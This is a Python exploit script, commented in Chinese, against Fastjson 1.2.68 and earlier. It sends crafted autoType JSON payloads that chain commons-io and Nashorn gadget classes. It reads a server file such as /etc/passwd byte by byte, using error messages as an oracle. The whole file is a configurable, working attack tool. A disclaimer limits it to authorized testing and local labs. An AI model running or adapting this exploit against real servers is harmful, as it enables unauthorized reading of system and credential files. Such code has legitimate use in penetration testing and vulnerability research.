#!/usr/bin/env python3
"""Fastjson <=1.2.68 commons-io 报错读文件（固定原脚本，按环境自行修改）。

原理：BOM bytes 前缀猜对 → 出现报错/特征；猜错 → 无特征。逐字节扩展前缀。
不同环境报错标识不同，请改 ERROR_MARKERS / MATCH_STATUS_GE / MATCH_BOM。

依赖: pip install httpx
用法: python this_script.py
仅用于授权测试 / 本地靶场。
"""
from __future__ import annotations

from typing import Optional, Sequence

import httpx

# ===== CONFIG（按真实环境修改）=====
TARGET = "http://127.0.0.1:18268/api/fastjson"
FILE_URL = "file:///etc/passwd"
MAX_LENGTH = 50
CHARSET_BYTES = None  # 若为 list[int] 则优先
CHARSET_NAME = "mixed"  # mixed / lower / printable

# 命中判定 —— 按目标响应自行增删
# 常见: "charSequence", "ClassCastException", "BOMInputStream",
#       "org.apache.commons.io", "JSONException", 业务错误页关键字
ERROR_MARKERS = ["charSequence"]
MATCH_STATUS_GE = 400  # 不需要则改为 None
MATCH_BOM = True  # 响应 JSON 含 "bOM" / "BOM"

WRAP_CURRENCY = False  # 业务点有期望类时改为 True
CURRENCY_FIELD = "currency"
TIMEOUT = 15.0
VERIFY_TLS = True
PROXY = None
HEADERS = {"Content-Type": "application/json"}
# ===== END CONFIG =====

ASCII_LINUX_LOWER = [10, 32, 45, 46, 47, *range(48, 58), 91, 92, 95, *range(97, 123)]
ASCII_LINUX_MIXED = [
    10,
    32,
    45,
    46,
    47,
    *range(48, 58),
    *range(65, 91),
    91,
    92,
    95,
    *range(97, 123),
]
ASCII_PRINTABLE = list(range(10, 127))
CHARSET_PRESETS = {
    "mixed": ASCII_LINUX_MIXED,
    "lower": ASCII_LINUX_LOWER,
    "printable": ASCII_PRINTABLE,
}


def resolve_charset() -> list[int]:
    if CHARSET_BYTES:
        return [int(b) & 0xFF for b in CHARSET_BYTES]
    key = str(CHARSET_NAME).strip().lower()
    if key not in CHARSET_PRESETS:
        raise SystemExit(f"未知 CHARSET_NAME={key!r}")
    return list(CHARSET_PRESETS[key])


def _jesc(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')


def build_payload(bom_bytes: Sequence[int]) -> str:
    """对齐工具内 build_io_read_error。"""
    bom = ",".join(str(int(b) & 0xFF) for b in bom_bytes)
    u = _jesc(FILE_URL)
    ac = '"@type":"java.lang.AutoCloseable"'
    raw = (
        "{"
        + '"abc":{'
        + ac
        + ","
        + '"@type":"org.apache.commons.io.input.BOMInputStream",'
        + '"delegate":{'
        + '"@type":"org.apache.commons.io.input.ReaderInputStream",'
        + '"reader":{'
        + '"@type":"jdk.nashorn.api.scripting.URLReader",'
        + f'"url":"{u}"'
        + "},"
        + '"charsetName":"UTF-8","bufferSize":1024'
        + "},"
        + '"boms":[{'
        + '"@type":"org.apache.commons.io.ByteOrderMark",'
        + '"charsetName":"UTF-8",'
        + f'"bytes":[{bom}]'
        + "}]"
        + "},"
        + '"address":{'
        + ac
        + ","
        + '"@type":"org.apache.commons.io.input.CharSequenceReader",'
        + '"charSequence":{"$ref":"$.abc.BOM"},'
        + '"start":0,"end":0'
        + "}"
        + "}"
    )
    if WRAP_CURRENCY:
        escaped = raw.replace("\\", "\\\\").replace('"', '\\"')
        return '{"@type":"java.util.Currency","' + CURRENCY_FIELD + '":"' + escaped + '"}'
    return raw


def is_hit(status_code: Optional[int], body: str) -> bool:
    text = body or ""
    if MATCH_STATUS_GE is not None and status_code is not None:
        if status_code >= int(MATCH_STATUS_GE):
            return True
    if MATCH_BOM and ('"bOM"' in text or '"BOM"' in text):
        return True
    for marker in ERROR_MARKERS:
        if marker and marker in text:
            return True
    return False


def main() -> None:
    table = resolve_charset()
    found: list[int] = []
    probes = 0
    print(f"[*] target={TARGET}")
    print(f"[*] file={FILE_URL} max={MAX_LENGTH} charset={len(table)}")
    print(f"[*] markers={ERROR_MARKERS} status_ge={MATCH_STATUS_GE} bom={MATCH_BOM}")
    with httpx.Client(
        timeout=TIMEOUT,
        proxy=PROXY,
        verify=VERIFY_TLS,
        follow_redirects=True,
        trust_env=False,
    ) as client:
        for _pos in range(MAX_LENGTH):
            matched: Optional[int] = None
            for b in table:
                probe = found + [int(b)]
                payload = build_payload(probe)
                probes += 1
                resp = client.post(
                    TARGET, content=payload.encode("utf-8"), headers=HEADERS
                )
                if is_hit(resp.status_code, resp.text or ""):
                    matched = int(b)
                    break
            if matched is None:
                print(f"[*] pos={len(found)} 无匹配 → EOF / 字符不在码表")
                break
            found.append(matched)
            content = "".join(chr(x) for x in found)
            print(f"[+] {len(found):3d} 0x{matched:02x} {chr(matched)!r} → {content!r}")
    content = "".join(chr(x) for x in found)
    print(f"[*] done probes={probes} bytes={len(found)}")
    print(content)


if __name__ == "__main__":
    main()
